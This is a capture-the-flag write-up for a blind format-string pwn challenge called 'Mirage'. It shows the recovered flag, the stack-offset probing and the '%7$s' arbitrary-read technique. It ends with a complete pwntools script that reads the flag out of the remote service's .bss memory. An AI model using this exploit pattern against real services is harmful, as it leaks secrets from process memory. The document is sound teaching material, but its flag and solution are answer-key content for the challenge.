---
title: "Mirage"
category: "Pwn"
tags: ["format-string", "arbitrary-read"]
solve_date: "2026-10-11T09:12:00+07:00"
language: "en"
---

# Mirage

**Flag:** `isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}`
**Target:** remote service `nc 0.cloud.chals.io 23023` (no binary provided)

| Item | Value |
|---|---|
| Category | Pwn - blind format string |
| Interaction | Line-based echo prompt `> ` |
| Flag format | `isfcr{...}` |

## Challenge

An echo service that "repeats back a little more than you said." No binary ships with the
challenge; the only observable is the live network service. Recover the flag from the running
process.

## Initial Analysis

Connecting to the service drops a `> ` prompt. Input is reflected back, but the reflection is fed
through `printf` rather than written verbatim:

- Sending `hello` echoes `hello`.
- Sending `%p.%p.%p.%p.%p` leaks stack values (`0x48725b.(nil).0x71.(nil).(nil)...`).

That single behavior is the whole vulnerability: the echo is a format-string sink with the input
directly controllable. The phrase "a little more than you said" is the leaked stack.

To locate our own input on the argument list, we sent a marker plus repeated `%p`:

```
MARKER.%p.%p....(%20)
0x48725b.(nil).0x71.(nil).(nil).0x252e52454b52414d.0x2e70252e70252e70....
```

The value `0x252e52454b52414d` decodes (little-endian) to `MARKER.%`, i.e. the start of our buffer.
It appears as the 6th leaked value, so **our input is at argument offset 6**. Slots 1-5 hold a
code/rodata pointer (`0x48725b` -> `quit`), two nulls and a small constant.

## Eliminated Hypotheses

- **Flag is a static string in `.rodata`.** Walking `.rodata` from the leaked banner pointer only
  produced glibc's internal assertion/malloc strings and the app's own strings (`quit`,
  `flag.txt`, the banner). No `isfcr{...}` lived in read-only data, so the flag is loaded at
  runtime rather than embedded.
- **Blind positional `%N$s` scan of low slots.** Dereferencing slots 1-45 as strings yielded only
  `(null)`, `quit`, code fragments, and the banner. The flag buffer is not pointed to by any of the
  reachable slots, so a plain slot walk is not enough.

## Exploitation Chain

1. **Turn the format string into an arbitrary read.** `printf` walks the buffer as a C string and
   stops at the first null byte, so a raw address cannot sit at the front of the payload. We place
   the target address at the *end* of the payload and reference it positionally, with the format
   portion padded to exactly 8 bytes so the 8-byte address lands on slot 7:

   ```python
   payload = b'%7$sAAAA' + p64(addr)   # "%7$s" derefs the address we just parked on the stack
   ```

   `printf` consumes `%7$s` (before any null byte) and prints the C-string located at `addr`. The
   trailing null bytes of a small address never truncate this because they come after all format
   specifiers.

2. **Confirm the binary is non-PIE (stable addresses).** `read_str(0x48725b)` returned `quit` and
   `read_str(0x489448)` returned the banner `[chall] mirage on 127.0.0.1:%d` on *every* fresh
   connection. The tested connections expose the same low image addresses, consistent with a non-PIE
   mapping in this service. This observation does not by itself prove static linking; the
   exploit relies on the measured data/BSS addresses rather than a stable stack address.

3. **Find where the flag lives.** Dumping `.rodata` app strings revealed `flag.txt`: the program
   reads the flag from a file at startup, so it must reside in writable memory (`.bss`/heap). We
   collected candidate pointer values leaked from the stack (values in the process image ranges)
   and dereferenced each with the arbitrary-read primitive.

4. **Recover the flag.** One dereferenced `.bss` pointer at `0x4b6ac0` returned a live flag string:

   ```
   0x4b6ac0: b'isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}'
   ```

## Flag

`isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}`

The flag was read directly out of the process `.bss` via the format-string arbitrary-read
primitive and re-read on a separate connection to confirm it was stable, not a transient leak. Its
`isfcr{...}` wrapper matches the announced format. It was not submitted to the scoring service, so
acceptance is unconfirmed.

## Reproduce

Requires Python 3 with `pwntools`. Connect to the live service and read the flag buffer directly at
the fixed non-PIE address `0x4b6ac0`:

```python
from pwn import *

HOST, PORT = '0.cloud.chals.io', 23023

def conn():
    r = remote(HOST, PORT, level='warn')
    r.recv(timeout=3)          # initial "> " prompt
    return r

def read_str(addr):
    r = conn()
    # "%7$s" + 4 filler bytes = 8 bytes, so the parked 8-byte address lands on slot 7
    r.sendline(b'%7$sAAAA' + p64(addr))
    resp = r.recv(timeout=2)
    r.close()
    return resp.split(b'AAAA')[0]

print(read_str(0x48725b))      # b'quit'                 -> technique sanity check
print(read_str(0x489448))      # b'[chall] mirage on 127.0.0.1:%d' -> non-PIE banner
print(read_str(0x4b6ac0))      # b'isfcr{...}'           -> flag in .bss
```

Expected output:

```text
b'quit'
b'[chall] mirage on 127.0.0.1:%d'
b'isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}'
```

To rediscover `0x4b6ac0` from scratch rather than hardcoding it: leak `quit` as `%1$s` / `%p`,
park `%7$sAAAA` + `p64(0x489448)` to confirm the banner address is stable across connections,
walk `.rodata` strings to find `flag.txt`, then collect leaked stack pointers and dereference each
with the same `%7$s` primitive until a string beginning `isfcr{` appears. Note that a raw address
placed at the start of the payload is cut by its own null bytes, so the address must always go after
the format specifiers.
